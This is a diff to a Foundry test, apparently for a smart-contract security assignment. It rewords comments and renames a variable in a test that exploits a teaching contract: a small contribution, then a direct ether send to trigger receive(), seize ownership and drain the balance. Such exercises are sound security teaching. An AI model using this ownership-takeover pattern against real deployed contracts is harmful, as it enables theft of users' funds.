@@ -17,33 +17,33 @@ contract Assignment11ExploitTest is Test {
 
         target = new Assignment11();
 
-        // fund the target contract to be drained
+        // Fund the contract with ether to simulate real funds
         vm.deal(address(target), 1 ether);
     }
 
     function testExploit() public {
         vm.startPrank(attacker);
 
-        // 1. Make a valid contribution
+        // Step 1: Contribute < 0.001 ether to pass the check
         target.contribute{value: 0.0005 ether}();
 
-        // 2. Trigger receive() with direct ether send
+        // Step 2: Send ether directly to trigger `receive()` and become owner
         (bool success, ) = address(target).call{value: 0.0001 ether}("");
-        require(success, "Failed to send ether to fallback");
+        require(success, "Fallback call failed");
 
-        // 3. Ensure ownership was transferred
+        // Step 3: Check that ownership has been transferred
         assertEq(target.owner(), attacker, "Ownership not transferred");
 
-        // 4. Withdraw the contract’s balance
+        // Step 4: Drain the contract
         uint256 before = attacker.balance;
         target.withdraw();
-        uint256 after = attacker.balance;
+        uint256 afterBalance = attacker.balance;
 
-        assertGt(after, before, "Funds were not drained");
+        assertGt(afterBalance, before, "Funds were not drained");
 
         vm.stopPrank();
     }
 
-    // Receive function so the test contract can accept ether if needed
+    // Allow contract to receive ether if needed
     receive() external payable {}
 }
